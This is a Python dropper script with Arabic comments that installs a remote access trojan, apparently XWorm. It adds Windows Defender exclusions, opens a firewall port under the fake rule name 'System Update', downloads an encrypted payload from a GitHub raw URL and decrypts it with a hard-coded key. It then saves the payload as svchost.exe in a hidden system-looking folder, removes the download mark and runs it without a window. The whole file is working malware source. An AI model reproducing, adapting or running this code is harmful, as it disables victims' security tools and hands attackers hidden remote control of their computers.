import os
import sys
import subprocess
import base64
import requests
import ctypes
from cryptography.fernet import Fernet

# ============================================
# CONFIG
# ============================================
PAYLOAD_URL = "https://raw.githubusercontent.com/zeta090/data/main/client.enc"
FERNET_KEY = b'_nJAk7ML6kCHXZVerQL8X8skcCL378XXU5kTYPKuJxY='

# ============================================
# DEFENDER EXCLUSION
# ============================================
def add_defender_exclusion(path):
    """إضافة مجلد إلى استثناءات Defender (يتطلب صلاحيات مدير)"""
    try:
        cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \'{path}\'"'
        subprocess.run(cmd, shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except Exception as e:
        return False

# ============================================
# FIREWALL EXCEPTION
# ============================================
def add_firewall_exception(port):
    """إضافة استثناء في جدار الحماية لمنفذ معين"""
    try:
        cmd = f'netsh advfirewall firewall add rule name="System Update" dir=in action=allow protocol=TCP localport={port}'
        subprocess.run(cmd, shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except Exception as e:
        return False

# ============================================
# DOWNLOAD & DECRYPT
# ============================================
def download_payload(url):
    """تحميل الحمولة المشفرة من الإنترنت"""
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        response = requests.get(url, headers=headers, timeout=30)
        if response.status_code == 200:
            return response.content
        return None
    except Exception as e:
        return None

def decrypt_payload(encrypted_data, key):
    """فك تشفير الحمولة"""
    try:
        cipher = Fernet(key)
        return cipher.decrypt(encrypted_data)
    except Exception as e:
        return None

# ============================================
# EXTRACT & RUN RAT
# ============================================
def extract_and_run(rat_bytes):
    """كتابة الحمولة في مجلد مخفي وتشغيلها"""
    try:
        # مجلد النظام (مخفي)
        rat_folder = os.path.join(os.environ.get("PROGRAMDATA", "C:\\ProgramData"), "Microsoft", "Windows", "Temp")
        if not os.path.exists(rat_folder):
            os.makedirs(rat_folder)

        rat_path = os.path.join(rat_folder, "svchost.exe")
        with open(rat_path, "wb") as f:
            f.write(rat_bytes)

        # إزالة علامة "تحميل من الإنترنت"
        subprocess.run(f'powershell -Command "Unblock-File -Path \'{rat_path}\'"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

        # تشغيل الحمولة مخفية
        subprocess.Popen(rat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except Exception as e:
        return False

# ============================================
# MAIN
# ============================================
def main():
    # 1. إضافة استثناءات Defender
    temp_folder = os.environ.get("TEMP", "C:\\Temp")
    add_defender_exclusion(temp_folder)
    
    rat_folder = os.path.join(os.environ.get("PROGRAMDATA", "C:\\ProgramData"), "Microsoft", "Windows", "Temp")
    add_defender_exclusion(rat_folder)

    # 2. إضافة استثناء Firewall (منفذ 8080 - غيّره حسب إعدادات XWorm)
    add_firewall_exception(1177)

    # 3. تحميل الحمولة
    encrypted_data = download_payload(PAYLOAD_URL)
    if not encrypted_data:
        return

    # 4. فك التشفير
    rat_bytes = decrypt_payload(encrypted_data, FERNET_KEY)
    if not rat_bytes:
        return

    # 5. تشغيل الـ RAT
    extract_and_run(rat_bytes)

if __name__ == "__main__":
    main()